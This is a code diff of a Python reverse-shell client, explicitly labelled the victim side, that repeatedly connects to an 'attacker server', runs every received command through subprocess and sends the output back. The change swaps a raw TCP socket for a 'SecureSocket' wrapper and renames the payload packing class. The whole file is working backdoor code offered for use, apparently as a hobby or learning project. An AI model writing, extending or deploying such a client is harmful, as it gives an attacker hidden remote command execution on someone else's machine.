@@ -1,43 +1,32 @@
 import subprocess
-import socket
-import time
-from payload import Payload
+from command_payload import CommandPayload
+from command_payload import parse_payload_to_output
+from secure_socket import SecureSocket
+
 
 # Attacker server ip and port
 ip = "localhost"
 port = 7890
 
+
 # Create the victim socket that keep trying to connect to the server
 def create_socket():
-    # Create a TCP/IP socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Connect the socket to the server
-    server_address = (ip, port)
-
-    # Keep trying to connect to the server
-    while True:
-        try:
-            sock.connect(server_address)
-            print("Connected!")
-            break
-        except:
-            print("Trying to connect to server ...")
-            time.sleep(1)
-
+    secure_socket = SecureSocket()
+    secure_socket.connect()
     while True:
         # Receive data from the server
-        data = sock.recv(1024)
+        data = secure_socket.receive(parse_payload_to_output)
+        command = data.command
         print('Received:'.center(40, "="))
-        print(str(data.decode()))
+        print(command)
 
         # Generate command
-        stdout, stderr = run_command(data.decode())
-        payload = Payload(stdout=stdout, stderr=stderr)
-        packet = payload.get_packet()
+        stdout, stderr = run_command(command)
+        payload = CommandPayload(stdout=stdout, stderr=stderr)
+        packet = payload.pack()
 
         try:
-            sock.sendall(packet)
+            secure_socket.send(packet)
         except:
             create_socket()
 
